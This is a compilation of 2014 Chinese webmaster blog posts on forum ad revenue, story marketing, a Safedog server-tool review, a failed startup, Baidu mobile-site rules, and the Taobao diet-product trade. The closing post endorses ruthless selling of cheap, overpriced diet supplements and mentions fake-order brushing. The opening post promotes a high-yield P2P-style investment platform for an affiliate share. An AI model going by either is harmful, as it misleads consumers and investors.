　　其次，说一说挣钱的方式。没错，就是打广告(废话，不打广告还能干啥)，你会问了，大家都在打广告，你是怎么一天挣6000的，遇到一个傻逼公司?当然不是，这钱我挣得心安理得，而且是用效果说话，哥们带去的是实实在在的RMB。
　　(很多站长都妄想着有多少公司来找你，然后给发个帖子就能脱贫致富，拉个广告位就能瞬间买房置地娶老婆，哥们醒醒吧!)
　　一. 靠谱合作
　　有一个比较现实问题是，是不是给钱就投?这事大家不用掖着藏着，本来嘛，好不容易守来一个投广告的，难道还拒绝?别人不骂你装X才怪(当时就有人骂我当了XX，还立牌坊!)但我的答案是：该装的时候就得装着，而且得装得有道理，咱只卖艺，不卖节操，业界良心的说!
　 　举个例子，有人说现在和游戏公司合作最挣钱，我绝不否认，但请大家看清一件事情，游戏公司是怎么挣钱的，给大家模拟一个场景吧!假如你有100个IP在 游戏里注册了，也玩了，也充值了，你也拿到了几百块大洋!你以为这样你就实现价值最大化了吗?狗屁!通常的结果是，流失50%的活跃用户，原因很简单：游 戏公司的终极目的是要你的用户充值买装备(吸血鬼的干活)，而且往往是骗冲(中国的网游，你懂的!)，等大家幡然悔顾、或者是玩腻了之后，你说他最后怪 谁?
　　所以，别管你论坛大小，不该碰的绝对不碰，都说了用户是“上帝”，你戏弄上帝，会死得很惨!
　　然后我开始想一件事，能不能找到那种满足双方需求的“产品”，比如说既能满足广告方，又能满足用户需求的。基于这种崇高的指导思想，我总结了这些关键点：
　　生理需求(这个整不好就成拉皮条了，不能碰);
　　爱情需求(与婚恋网站合作);
　　物质需求(电商广告，关键是人家不稀罕你);
　　投资需求(投资理财，互联网金融的兴起)
　　…….
　 　这么分类纯碎是基于本论坛情况，当然还有很多遗漏的，大家可以补充。不过，千万别想一次性全捞住，你得根据你的论坛里用户的话题和兴趣等来判定最合适 的，就我的情况，论坛里大部分都是30岁以上的成年人，而且大部分都在一二线城市，收入还不错，平时说得聊得话题无非是家庭婚姻啊，投资理财等等，所以很 明显：爱情需求和投资需求在我这里比较靠谱。
　　然后就开始找呗，也别抹不开面子，也千万别等。一开始我只找了10多家婚恋公司和20多家投资理财平台，把自己的实际情况介绍一下，适当地催催牛逼是可以的。比如自己的用户与对方目标受众多么匹配啊等等….不过最后还是要看“疗效” !
　　第一轮下来总体情况还不错(也蛮惨的)，有1家婚恋网站/2家网络理财平台愿意合作，.按常理说，接下来就应该是谈合作方式(后面具体谈)，谈广告怎么投等等，但是先别急!!!
　　还是那句话，得对得起“业界良心”，哪怕是咱小小的论坛呢!你放上去了就得为别人负责，先不说造福用户，最起码的一点不能坑人家。谈婚论嫁和投资理财都不是小事，所以你得摸底，甚至自己得体验。
　　体验结果如下：
　 　1. 婚恋网站：首先是公司调查，最TM气人的是：这家公司在工商局查不到任何注册资料，fuck!后来去就公司偷偷摸摸考察，原来这个网站是一个特别小的婚恋 中介公司外包干的，四五个人租一个单元，一窝子匪气，蹲守一天未见顾客上门，我果断放弃，这要是万一有用户去了被坑结果还是我的责任…..
　 　2. 理财平台：两个理财平台，都是近期超火的的互联网金融，收益率12%-15%，比银行和余额宝都高多了，市场上看发展潜力巨大，一家是P2P模式(个人对 个人借贷);一家是P2B模式(个人对企业借贷)，从公司背景到实地考察发现都没问题(一家在永安里，一家三里屯SOHO)。
　　然后就是 看平台，搜行业，一搜就发现了差异：大家普遍反映P2B模式安全性远高于P2P，虽然具体不懂，但有一点我很明确，投资理财，安全是第一位的。考虑了一下 索性自己拿钱去投，结果比较有戏剧性：投P2P的倒没有出现安全问题，但是借款方逾期一周;投P2B一切正常….
　　结果不言而喻了。
　　总得来说就一点：伺候好上帝!一切妥妥的!
　　二.投放那点事
　　合作方确定后，下面就开始谈合作方式，通常的论坛做法是，发个帖子XX元;广告位千次点击XX元;注册一个用户XX元(最早我也想这么干)
　 　但是对方的什么总监(据说是清华的，在华尔街干过)建议按分成算，从利润中拿出0.5%给我，开始我不同意!一是没自信，感觉太少，二是没这么干过，不 知道效果，后来一想，先试一下吧!反正聊胜于无嘛……不过有一点我很确信，他们平台不错，当时还想要是论坛挣不了钱，干脆自己去那投资得了。
　 　接下来就是投放方式了，别那么硬!也别太软了，我的原则是说实话，千万别把“上帝”当傻子，假的真不了!帖子也好，链接也好，你要是有化“广告”于无形 的本事那也行，如果没那能耐!干脆老实点。比如我，理科出身，不会文案也不会PS，但我有亲身体验的经历啊，那我就把这件事说清楚，把自己的账户里的收益 情况老老实实给大家看，明眼人会懂的。
　　(最好能贴出收益)
　　三.合作效果公布：
　　扯了不少水的东西，下面给大家公布一下合作效果吧!
　　截至现在，和理财范(经合作方同意公布)合作三天，共带去投资用户40人，总计投资额100多万!给用户带来投资收益超过7万，本站长当天收益6000元。详见下图!
　　
　　情况就是这么个情况，也没啥保留的了!你要是能带去1000万，那你挣6万(据合作方说已经有了)，要是一个亿，我草!……扯远了哈!其实我没那么大野心，只想本着“大家好，才是真的好”的心思挣点钱，改善一下生活，仅此而已。
　　最好总结一下吧：咱们干站长的都不容易，其实大家个个都有一腔热血，但想说的还是那句话：你为用户着想(当然不仅仅是给他们挣钱)，他们自然不会亏待你。
　　最最后，祝大家早日脱贫致富，完毕!
　　欢迎大家拍砖，吐槽。大家可以加我Q 957914438。欲与理财范合作的个人站长，我可以牵线搭桥，只是别忘了请兄弟我搓一顿。
　　感谢hongchase的投稿
 
已有 1 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
故事营销：一个具有争议的成功营销案例, lusongsong.iteye.com.blog.2039076, Mon, 31 Mar 2014 23:54:08 +0800

导读：读完全文我就知道了作者想说的是故事营销，为什么我轻松读完?因为这篇文章本身就是个小故事。这就是故事营销的威力。另外江水平通过互联网接单做生意也是故事营销的典范。大家可以学习借鉴下。
(故事营销案例：以后就这样介绍自行车)
 
那 时候我已经做了竞价几年，因此代理公司请我们这些客户去郊游，说白了就是出去玩，去的地方倒没什么特别，就是在附近的一些小山村，先爬山，完了后 去村里吃饭。但这次经历给了我很大的感触，到现在仍然记得，只是没有将它落在纸上，就怕很多人的真实评论破坏了我心中当初的那种美好。
 
现在写下来因为觉得已经没什么了，自己看清楚了一些营销的本质，觉得我们该善于对待任何不出格的营销方式。
 
我 们当初去的是秦岭山下的一个人家，葱葱郁郁的树木，蜿蜒的小道，田地里种满了各类果树，正直初夏果实累累。每个人都很兴奋，心情也舒畅，导游大概 讲了下行程，我们便满怀向往地向着小山村跑去，首先接待的是一个老村长，他很早便来迎接我们，似乎让我们顿时觉得自己是城里人的感觉。老村长也是村里唯一 一个老师兼校长，当然这是前几年。现在他退休在家，但仍然没有闲住，因为他一直在做一件事情：就是在坚持中国四大发明之一，最古老的造纸术，手工造纸。在 我们吃过午饭后，老村长便给我们说，想给大家讲讲我们到现在最古老的造纸术，说这个真的需要我们好好去了解，好好去保护好祖先的东西，不要再让人给糟蹋 了。他说的有点激动，说他从教书开始就一直想做这件事，直到退休终于有了全部的精力来做。
 
他说这个村子里的造纸可以追溯到隋唐时期，当时是宫里唯一的提供纸张的地方，是著名的纸坊，除了宫里外只有少许的一些当时名人才用得起这里的纸张。经历了几个朝代更迭都没有毁坏这里的纸坊，在国民政府时期仍然完好，一直到解放后，就在他小时候仍然存在。
 
他 现在60岁，就在他10岁的时候村里已经断断续续不再做这类手工纸了，而且伴随着村里老人的去世，会造纸的越来越少，眼看就要失传，他便一边教书 一边去寻求会造纸的老人教年轻人造纸，但是老人愿意教，很多年轻人不愿意学，因为觉得没前途，他们需要外出打工挣钱养家，于是一耽搁又是几年。但心里从来 没放下过，而且觉得一定要做成这个事情，于是退休后马上又去找老人，结果会的老人已经不多了，附近几个村子就剩了那么一两个人。所以他专门让人请过来，好 吃好喝招待，又给人家儿子的一些粮食，然后责令让自己的儿子学。因为手续比较麻烦，而且道具也需要专门手工去做，所以耗费了不少精力，他也将所有的之前积 攒的和退休后的工资全部购买了材料和家当。
 
两个儿子学了一两年，只有一个学到了一些技术，另一个没有悟性还没法学到一些精髓。随后他又去挨家挨户鼓动别的孩子来学，为此遭了不少白眼。最终又有一两个年轻人加入进来，总共前前后后学了4年，两个传授的老人也因为年事已高先后去世，所以就只剩了他们，寥寥几个人。
 
其 中最让他潸然泪下的是因为当初他一个人教出了三四个清华北大学生，又有一个学生当了县长，另个当了农林局的领导，这是他的骄傲也是他现在的耻辱， 他说在他们当时准备造纸的时候，自己多年来的钱花光了，也没有原材料，这种原材料只有其中一座山上的树皮才可以用，他当时想以他老师的身份，刚好学生在管 这个事情，于是自己就跑一趟，结果他找了三四次都以借口避而不见，他只有堵在门口，不得已接见后也婉言拒绝，因为他当时的自尊心强就立刻便拂袖而走，于是 又找到了另一个学生，学生对他很恭敬，但当他说到此事时屡次打岔，最后将他干脆当作了空气。一气之下他跑回村里发誓再也不去找了。说到这里他潸然泪下，说 自己就当初差点跪下来了，说为了祖先这点东西自己哪怕尊严啥都不要，自己一个教了一辈子书，铁骨增增的人，在这么短短的一年内尝遍了所有的人情世故和酸甜 苦辣，也伤透了心，抛弃了尊严，变成了厚脸皮。
 
他的这段话让我们 内心唏嘘，而且真的很感动。他屡次哽咽，仿佛将多年挤压的委屈全部倒了出来。他随后给我们看了他在中央台讲解造纸术的视频，说最后 是他借了所有亲戚的钱，包括村上的钱去购买了一些树木，回来做成了第一批纸张，随后有西安电视台一个记着了解到了情况进行了报道，随后关注度才起来。老人 说到这里摸了一把眼泪，说到现在纸张已经造出了很多，他当县长的学生又来问他要纸说是送领导，他一个也没给，说就算把村子买下来也不会给。
 
随 后老人又带我们参观了所有的造纸现场，和他供奉的造纸祖先像，让村子里的人给我们演示了一下造纸的所有工艺，然后有很多人提出来想要看看造出来的 纸张，他只说先不要着急，等把这里讲完。在参观的过程中他给我们看了自己保存的纸张，都是存在了上千年的，在简陋的展览室里，说这种纸张最大的特点就是保 存时间非常长，而且画出来的画，写出来的字都不会变颜色，而我们现在用的一些纸张不但会变颜色而且很快会风化，一般的书纸都是几年的，而现在做国画所用的 宣纸也都只能存在几十，上百年，有质量比较好的也只能存在一百多年便会风化，现在的造纸术是先进了，但是在制作工艺的完整性以及材料上仍然没法跟手工的相 比，手工是真真实实一遍一遍做下来的，经过高温的煮，而后蒸，再之后踩，是人用脚一脚一脚踩出来的，随后砸，用磨平的石块一下一下砸，而后又进行一次煮， 随后过滤，而后进入池子，沉淀等等，经过了很多道程序，而且做出来一张纸要很多天。
 
这就是他给我们所说的全部，随后让我们参观了做出来的成批量的纸张，我们都非常好奇地看，随后就有人提出来说这个能不能买啊?
 
老人刚开始说这个不买的，现在村里有一两个年轻人在做这个事情，我们不想将它变成商业的，今天给你们说就是为了让你们知道咱们老祖先的东西，能更好地宣传和传承下去，让更多的年轻人了解和学习。
 
你 们可以亲手摸一摸这纸张，看看是不是跟一般的不一样，而且你们也可以回去后写字画画看看。这时候就有很多人跟老人说，就让我们买一些吧!也好做个 纪念，也算是我们的一点心意，虽然捐不出很多钱，但也只能买点纸了。很多人掏出钱问老人一张多钱，老人犹豫了好一阵子，说这纸本来不能卖的，你们想要就一 张5快吧!大的10块。于是很多人掏钱买了很多张，我当然也是其中之一，因为我从小喜欢这类东西，而且刚好也喜欢点字画，于是乎买了20张，很想回去画点 画让子孙后代存留个上千年。
 
我们一行总共有两百人，一人平均买5张，一张10块，总共多钱，大家可以算算。
 
以上就是我说的全部过程。可能有很多人觉得这不是一次营销行为，我也不想将它当作一次营销行为，但偏偏它就是营销，不管是不是刻意为之，它都是一次非常好的营销。
 
我可以帮助大家归纳下，为什么会成功，而且有这么多人买：
 
第一，他为产品包装了很多的历史文化，这其中包括他给我们看了那些古代的纸张，讲了纸坊的来历，再讲造纸的过程，和整个村庄的历史。
第 二，他给产品涂上了很多的感情色彩，以自己的故事为基础，讲述了进行这件事是多么困难的一件事情，而且屡次哽咽(当然，我相信可能当时真的很不容 易，他哭也是真的，而且我不怀疑他做的任何的事情，就算是营销我也不怀疑，因为无论如何他让我们得到了很多知识，和一种民族荣辱感。)
第三，他用产品的繁杂的制作过程来给我们讲述产品的好。过程的繁杂能体现出质量的好坏，做的人用心的程度，困难程度也能体现出质量的好坏。
第四，他给我们做了对比，说了产品的优势。他与现在的纸张做了比较，谈了手工做纸的保存时间。这是个很大的卖点。
第五，他增强了产品的珍贵性，稀有性。他说现在每到旅游季节有很多外国人专门过来看这个，而且都要带一些回去。
第六，也是最重要一点，最终的成交是我们主动的，而他至始至终没有给我们任何的推销。他用了整个过程来操控。
第七，也很重要，其实他非常成功地运用了体验式营销。他让我们自己体验了一个过程，让我们沉浸在其中。自己已经在内心说服了自己，认可的所有的东西。至始至终没有任何怀疑。
 
到 现在我心存敬意，只不过觉得纸有点贵而已，其他我觉得所获还是挺多。这真的是一次很成功的营销，也许老村长是本色出演，利用了自己真实存在的东 西，但是却让我事后总结了很多，了解了营销的最真实的东西。说实话他朴实的状态首先打动了我们，然后又给我们以讲历史的形式作为切入点，再又放出他在中央 台讲解的视频让我们更加对他有敬意，到接下来给我们讲亲身经历感染感动每个人，再到整个造纸过程的体验，纸张的对比等等整个环节下来，是不是很完美。
 
一次完美的营销，事后确实很有争议，因为有很多人觉得这不是营销。所以大家看到这次营销多么成功么?
 
而且我们为此争论了很长时间，到现在我将它当作一次完美的营销，别人将它当作一次身心灵之旅，可我内心却是对那个老村长充满敬意，不管他处于什么目的，但这个手工造纸术确实不能失传，需要我们好好去了解和保护。
 
【作者程霄 微信：CXX000111】
 
【文章来源：卢松松博客  原文地址：http://lusongsong.com/reed/988.html​】
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
安全狗“服云”服务器管理平台的优势与不足, lusongsong.iteye.com.blog.2034809, Sat, 22 Mar 2014 11:10:30 +0800

服务器被攻击是常有的事，自从上一次被ARP攻击后最先想到的是安全狗，其实除了安全狗貌似还找不到别的软件来管理服务器，尤其是免费的，它在服务器防护这块很出名， 应该算是服务器中的“360安全卫士”。
现在在服务器上用安全狗快一年了，个人觉得这软件还不错，所以推荐一下，让大家了解下我是如何管理服务器的。广大站长可酌情的考虑使用。
官方近期上线了安全狗服云平台，官方宣传是服务器安全管理云平台，能够对服务器进行批量安全管理，先登陆下web端的网站，一个帐号所有工具和服务都用了，pm2.5、服务器监测、告警的等功能，这些功能都能可以PC和手机端看的到。
“服 云”就是一个帐号可以登陆web端、手机端和PC端，任何一个端口都能管理和维护服务器，还是比较方便的。我目前看好的是手机端的，因为个人站长不可能时 时监控服务器，装了APP的话可以在外面远程重启服务器或IIS（在外面的时候如果遇到服务器挂了，直接用手机重启服务器了，非常方便）。而且通过APP 收取告警信息，还免去了短信通知的费用。
下面我就对我用的这项服务做一个总体阐述：
最满意的：手机控制服务器
因为不是搞运维的，另外自己有几台服务器和VPS，而且对个人站来说不可能做时时在电脑前。所以下了个客户端，网站如果出现流量异常或服务器宕机，直接可以用手机操作。如下图所示：
打开服云APP，就能看到当前所有服务器的状况，心情好的话，还可以用手机给服务器做体检，而且是多台服务器管理哦，另外安全狗出的这个PM2.5功能到是挺新鲜，一眼就能看到当天服务器的环境状况。这不过是次要的，重要的是下图：
如果网站出现异常，APP会发出通知，看看网络流量、CPU、内存使用情况，能大致判断网站是否流量异常或被攻击了。如果发现问题可以上网看看是什么原因，如果在外面，就直接重启服务器。不过对我这外行来说，重启IIS或服务器是最常用的功能。
另外装上手机客户端基本都能第一时间收到信息了，而且还免费的。
最不满意的：远程登陆对双屏支持不友好
它的服云PC客户端就像一个im，能方便的管理服务器和网站，所以就装了，如下图所示：
不过我本人用的是双屏显示器，结果用远程登陆服务器后就这种效果了：
远程屏幕过宽，窗口占满了两个显示器，操作起来很不方便，远不如系统自带的好，所以这功能一直没用。
另一个不满意的：对IE6支持不友好
在服务器端，如果要开通服云服务，也就是同时连接PC和手机客户端，那么就需要在服务器上的安全狗链接一下，坑爹的是比如我第一台服务器是win2003系统，默认是IE6，结果死活无法连接到云中心。
攻击消息提醒：
它IM端的消息提醒很不错，如果出现状况，它会有弹窗提示你，而且很详细，比如下面这图：
直接告诉你IP是122.49.35.99的这哥们正在暴利破解你的服务器。那么接下来怎么办?
也比较简单，远程登陆服务器，然后在网络防火墙—规则设置—增加规则里把这条IP加入黑名单即可。如下图所示：
注：如果能被安全狗拦截的，一般问题不大，如果不是反复攻击个人觉得没必要设置黑名单，另外也不太建议设置宽泛的规则，容易造成普通用户无法访问。
除了PC端之外，手机APP也能发出提醒，IM和app功能都差不多，我个人推荐用手机APP来看这告警信息，尤其在外出的时候，能迅速锁定情况。如下图所示：
目前来看IM和APP除了从启IIS和服务器的操作实用之外，剩下就是查网站/服务器安全状况了，它更多的功能还是在web端。
啥叫服云?
写了这么多，很多朋友可能有点乱。我用一张图来梳理下这几款工具的关系，大家一看便知：
没错，就是一个帐号可以登陆web端、手机端和PC端，任何一个端口都能管理和维护服务器，还是比较方便的。
最后一个建议：希望官方能看到
服务器安全狗的软件管家希望增加“我的软件”功能，在用户登录后可以记录该服务器下所安装的所有软件、插件。
目前来看，只有服务器常用软件下载，但缺少备份功能，比如我重做系统下次安装软件的时候只需要登录安全狗就能一键下载以前所有软件。
写在最后：
这个软件挺适合像我这样对服务器不了解的站长和网管的，目前来看它的竞品很少，尤其是从web端、PC端、手机端能做到三个平台都统一的还没有，能选择其他软件的不多，大家可以酌情使用。
本文作者：卢松松 原文地址：http://lusongsong.com/reed/977.html
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
失败创业者的告白：初创团队应有一位绝对领导者, lusongsong.iteye.com.blog.2032601, Mon, 17 Mar 2014 22:59:37 +0800

　　做了两年的项目失败了，我们的项目做的是数码3C的优惠信息，我是一个80后，小硕一枚;我们的1号创始人是90后，有激情、有梦想;在十八岁那年带上他的梦想千里北上，找我们的开复老师指点一二;但那时，开复老师正为他的创新工场忙得不亦乐乎，也就用了三分钟召见了我们的男一号。之后，男一号又南下广州调研;回来后，广发英雄帖，于是，我们走到了一起。
　　从一开始，我们的规划和分工很明确，前端、后台、美工、数据库以及市场营销各司其职。
　　
　　随着项目的推进，我们的问题逐渐暴露：
　　1.操作系统问题
　　之前大家都做过WEB项目，但真正上手做互联网领域的东西并负责运营维护，我们没什么经验;我们的项目，选择的是.net开发，这就造成我们只能选择 Windows环境。半年之后，我发现这个选择让我们很难受。我的体会是Windows真心不适合用来做服务器，为此，没少花费时间;当网站部署之后，需要经常远程维护，初期使用远程桌面软件，如向日葵什么的，太慢，之后改为Teamviewer，还算过得去;但总体维护的时间都还是耗在等待界面响应上;之后，我们考虑使用纯文本界面，但DOS那个鸡肋，可用性差，很多功能无法实现;再之后，我们装上了Cygwin，一个在Windows平台模拟 linux环境的软件，开通ssh，这样在维护上有所改进，但也只是解决了一小部分;如系统的运行监控、WEB服务器监控及数据库的操作，文本支持力度都太小，很难受;不过，跟其它问题相比，这个算是小的，毕竟可以通过多花些维护时间来解决;
　　2.前端人员的偏执
　　WEB原型出来后，这时候我们发现了问题;
　　我们的前端在学校的圈子是出了名的牛人，不过，这个牛人有些偏执，喜欢linux和firefox，鄙视IE、鄙视Windows;这是个人的立场和态度，我管不着，但是，他把这个偏见也带到开发中来，这样造成的后果就是我们的页面不兼容IE6!!!想想，2010年，IE在浏览器市场还占据着40%以上的份额，这个不兼容对任何一个互联网WEB的项目来说都是不可接受的; 于是，我们又开始花大力气兼容，要知道，这不是个简单的活。本来一开始呢，使用第三方库(Jquery、Ext)或是在开发方法上有意的规避不兼容问题，其实也都好办，但页面完成后，再开始修修补补，这对前端来说，很难受;
　　后来，这个前端就撤退了。我们不得不另寻高明;
　　再来的前端人员也实在受不了这样的不兼容问题，在修补让大家难受至极的情况下，我们选择了重做，比起修补，重做页面，可能来的更快;
　　3.人员更替
　　就这样一折腾，时间过去了不少;
　　由于迫切需要前端，在人员选择上我们没有向初始那样设定加入必须有资本金投入的条件;
　　再后加入的前端，相当于出售技术，我们承诺股权分配，需要说明的是，我们的创业资本不多，所以，对所有的人员都是零薪酬;股权这东西，看不见，摸不着，对新来的人开始是个新鲜，过了这股新鲜劲之后，就开始退烧，开始思考值不值得做，开始和我们不走同一条路，就这样，我们前后换了五个前端，这两年，我们一直处于一个找寻前端的过程中。
　　4.运营推广不力
　　我们的开发战线拖的太长，做出来的产品得不到市场有效的反馈。在完成一版之后，还没有大规模推广的情况下，又考虑改版，实施第二版计划，推迟推广;这缘于我们的男1号想在推出时让用户的体验更好，同时他又想出来一个好点子。这样，在几次改版后，我们的开发被搅晕了，加上前端的短板，宝贵的时间又耗费大半。
　　说说开发流程
　　我们的开发流程是这样的;开始，将整个web的需求说明书出来，然后在按照各自职责分工设计，接着就开始干了。最初别的需求不多，我们使用文档来交互处理新增的需求;但很快，我们发现这样处理的需求效率低下并且无法跟踪;之后，我们引入了一个需求管理软件WSS，功能很简单，但足够我们使用;同样，我们不久就建立的其它的辅助开发环境;
　　大公司对需求、代码和缺陷的管理使用的CQ、CC和QC, 同样，我们也部署了三套系统：需求就是WSS，代码使用SVN、缺陷使用的BugTracker;为了规范成员的行为，我又推出了wiki系统，并将常用的编码和操作规范总结成文，并实施。总体来说，我们的开发流程还算规范，但在人员上，我们失策了。
　　不记得是谁的一句话了，说得我体会深刻：一个创业团队的成功与否，只需看其最初的几个创始人，他们的行为和意志影响着项目的最终成败;我们团队创始人有5人，到最后，最初的几人中就剩我和男1号;今年六月，男1号也要撤了，这个项目的中心倒了，团队解散，公司注销。
　　后记：
　　这是一篇投稿到卢松松博客的文章，来自他亲身经历，同时他现在也在找合伙伙伴，有兴趣的朋友可以联系他。创业的过程中，尤其是年纪相仿、岁数不大的人聚在一起，团队成员各抒己见，往往在团队成员中都抱着“人人平等”的观念创业，可实际上“人人平等”造就出“各抒己见”的现象，最终结果是各做各的，导致项目失败。
　　这也是为什么卢松松用“乔布斯”做为博文配图的原因，我们应该学习他是如何聪明的选择什么时候该聆听，什么时候该坚持，也就是在做决策之前，领导人应该广纳百川，听取各种不同的观点，而一旦决策定了，这时你就应该贯彻执行，毫不妥协。在这之前，我认为初创团队应该有一位绝对地位的领导者。
　　通过大CC的故事，希望给即将走向职场、创业的朋友一些启发。
已有 5 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
如何建设一个适配“百度轻舟计划”的移动站, lusongsong.iteye.com.blog.2030703, Thu, 13 Mar 2014 22:52:47 +0800

百度轻舟计划已经出来了，目的很明确，提升百度在移动端的影响力，初步删除PC端的网页，加强移动站的网页权重吗，该计划要实现的目标是移动搜索达到百分百移动化。去年百度siteapp、开发者中心等是作为一次铺垫的话，那么今年百度应该要加快移动站的扶持力度了。
为什么这样讲?
无论是对百度还是站长都是一次机遇和挑战，我们知道百度在PC端的流量有着绝对优势，能给网站站长分出大量流量，而移动端迟迟不给力，我想其原因还是这几年APP的兴起，就像当年电脑刚刚普及一样，软件下载占据绝对优势，从而诞生了一批“下载站”。
而时至今日随着PC端“云计算”、HTML5等技术兴起，电脑上已经越来越不:需要软件，网页上能办到的事就不再需要软件，所以未来这类“下载”网站会越来越没落。
在卢松松看来，未来移动端的依然会以网页为主，用户手机里装的APP也主要是“BTA”等几款产品，真正常用的APP并不多。
接下来怎么做?
上面介绍了大环境，下面介绍下如何做一个适配“轻舟计划”的移动站?顾名思义，做这样的站尽量要符合百度的技术需求，尤其是没有话语权的中小网站来说，百度不可能为了你这1、2个站做专门的技术优化，你不是新浪、网易，百度没必要在你这里浪费时间，中小站长唯一能做的就是去适应。
那么如何去适应?百度方面已经给出了技术规范：
1. 首选自建h5移动站
百度移动搜索提倡站长使用h5自建移动站，不太提倡使用其他诸如xhtml等语言;同时，如果站长已有pc站并且在pc端网页搜索取得了一定的权重，建议使用站长平台的开放适配工具提交pc与移动站的对应关系，使得h5在移动端可继承部分pc端的权重;
2.自家的SiteApp
SiteApp是可以创建APP的站点，这个工具是专门为只有PC站但没有移动站的站长准备的，一站式移动建站工具，在前面的文章中我不止一次提要用“SiteApp建站”，这款工具不用多说，收录、抓取的都非常快。
大家直接登录http://siteapp.baidu.com/即可建站。
3.百度转码
如 果你自己不具备开发h5移动站的实力，对SiteApp更不敢兴趣，也不想用别家的“移动建站工具”，那么“百度转码”服务能够解决移动端搜索问题。但是 卢松松建议大家尽量不选择这种方式，第一转码服务的效果对用户体验不是很友好;第二使得自身应该获得到的流量停留在了百度的缓存最后实在不得已采用百度转 码了，那你还可以对自己的转码站进行认领，获取一点联盟收入也是不错的。
地址：http://m.baidu.com/l=3/tc?srd=1&dict=20&src=
我提供的模板就自带有百度转码服务，大家可以看看演示。
4.介绍一下开放适配工具
站长平台很早即推出了开放适配工具，第一可以帮助站长提交pc站与h5移动站的对应关系，前文也提到了不再多说;第二可以使用meta声明告诉百度这是移动站。
开放适配工具介绍：http://zhanzhang.baidu.com/wiki/62
告诉百度这是移动站最简单的方法是加入Meta声明，例：
<head>
<meta name="mobile-agent" content="format=html5;url=http://3g.sina.com.cn/">
……
</head>
这段代码是告诉只有用户通过百度移动搜索访问站点时才生效，会自动跳转到3g这个页面。而在移动端页面，还推荐用html5类型的移动页面制作(它是未来趋势啊)。
制作移动端页面时只需要加入HTML5协议的DOCTYPE：
<!DOCTYPE HTML>
移动站优化：
1：尽量用用html5移动页面制作。
2：网页中最好加上description属性的meta标签，如：
<meta name="description" content="卢松松博客是一个关注中小创业者、站长、搜索引擎、网络推广的媒体博客,是一个值得收藏的网站。" />
3：页面最好有清晰mypos导航信息。
例如：百度知道 > 电脑/网络 > Windows7 >当前浏览内容
4：以上说了这么多，最重要的是robots要对百度开放。
写在最后：
做移动站，想必绝大多数站长都会用现成的源码或工具建站，所以本文并没有给出建站方法，而是告诉大家如何判断这些代码或工具是否适合百度的轻舟计划。只有最基础的代码适应百度了，才能谈得移动站优化，而剩下的就靠自己坚持和努力了。
文章来源：卢松松博客  原文地址：http://lusongsong.com/reed/971.html
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
草根如何切入淘宝暴利的减肥市场?, lusongsong.iteye.com.blog.2026588, Thu, 06 Mar 2014 14:48:17 +0800

导读：逐鹿(个人微信号zhulutaobao)上次在卢松松博客投稿了一篇《关于双11的淘宝客无节操赚钱干货》，效果 不错，引起各大行业媒体转载。这次详细写了一篇深度解读淘宝暴利减肥市场的文章，里面有些内幕、有些操作手法，相比媒体网站只报个单纯的新闻之外，本文融 入了作者的经历和看法。
减肥产品非阳光产业，存在即合理，虽然我不沾减肥产品。此篇就事论事不论道义!
一路走来，玩过的测试过的：淘宝—谷歌adwords竞价—有道邮箱降价—有道内容竞价—淘宝—百度竞价—全网低成本营销等等，喜欢测试玩法，大量的资金用于不同的玩法，从淘宝到外网的玩法接触很多，最不缺玩法!
减肥是竞价中最大的类目，也是淘宝暴利产品中最大的一块蛋糕。归根到底：时代的富余+人性的惰根。减肥市场是永远存在的日不落市场，任何时候都可以搞，只要你懂得玩法，下得了狠心，草根很容易在这块蛋糕上以小博大的逆袭。我可以确定的说，只要你够狠心，没有转化率差的保健品，就一个核心点，任何人都逃脱不了人性!这里先不说!
一路目睹了淘宝减肥市场的变化，从产品的变化到流量来源的变化。产品方面，从最早的左旋肉碱到后来的P57，在到后来的中药卖点减肥，到模特内供减肥，到泰国进口减肥药，14年出现了俄国进口减肥药的苗头...精油类减肥产品一直存在...绿瘦和碧生源减肥茶属于品牌化运作减肥产品...
最 早由湖南卫视超热的左旋肉碱， 火了n年，而且一直是市场主流!左旋肉碱刚火的时候，可以说是竞价史上最极品的产品，转化率非常变态，由湖南卫视的节目为效果背书，最早做左旋肉碱竞价的 一批人，靠这个东西都玩到了千万级!真正的左旋肉碱是有减肥作用的，但是不会那么快速，婴儿奶粉里面添加防止婴儿过度肥胖。淘宝的左旋肉碱产品刚开始基本 都是C店在玩，初期的价格一般是298,198，然后随着市场泛滥，2012下半年和2013上半年主流价格98元左右，2013下半年和2014年基本 是9.9元包邮19.9元包邮的全出现了。淘宝上的左旋肉碱减肥产品成本一般都在10元以内，量大的甚至在5元以内，厂家以西安和广州最多，贴牌OEM几 万到十几万都能搞定，可以确定的说卖这些减肥产品的卖家不会去吃这些东西，想减肥的MM请想开点，后面我会推荐健康的减肥方法...
2012年左旋肉碱做的最猛的都是一些5皇冠店，了解这行的人知道那几个店，其中有些店我记得很清楚是在当初手机刷单漏洞中崛起的，疯狂的刷单后在秋后算账中漏网之鱼，然后就保持销量一直很猛，在夏季旺季单品销量在3万多件，一年利润上千万了，这些小C店的利润秒杀那些看似很牛逼的淘品牌什么的。
2013 年发生了转折，天猫减肥产品的切入，由于天猫的流量优势和信任优势，老牌减肥C店节节败退，并非C不牛逼，实乃败给了势—淘宝背后的大手。一些减肥专营店 迅速崛起，绿瘦旗舰店切入后迅速以高客单价高销量霸占了豆腐块位置。利润虽然很猛，但是每个店都是如履薄冰，生怕明早睡起来宝贝被删了，人在淘宝下必然受 制，甚至有些大店需要联合淘宝小二，宝贝只要安全存在就是最强悍的持续印钞机!
左旋肉碱和P57在淘 宝 的持续泛滥，必然需要差异化的产品出现，以中药为卖点的产品出现了，有些是中药，大部分其实就是左旋肉碱成分打着中药旗号。这也是顺势而为，大家可以去看 当当图书市场，尤其是前两年图书销售排行榜中养生数据占了一半左右，强势的教育，对于一些西医无法的亚健康问题中药养生近乎神化，我很喜欢中医，但是市面 上太多的中医包装的产品是坑爹的。打中药卖点的减肥产品定价更容易价格高于左旋肉碱。
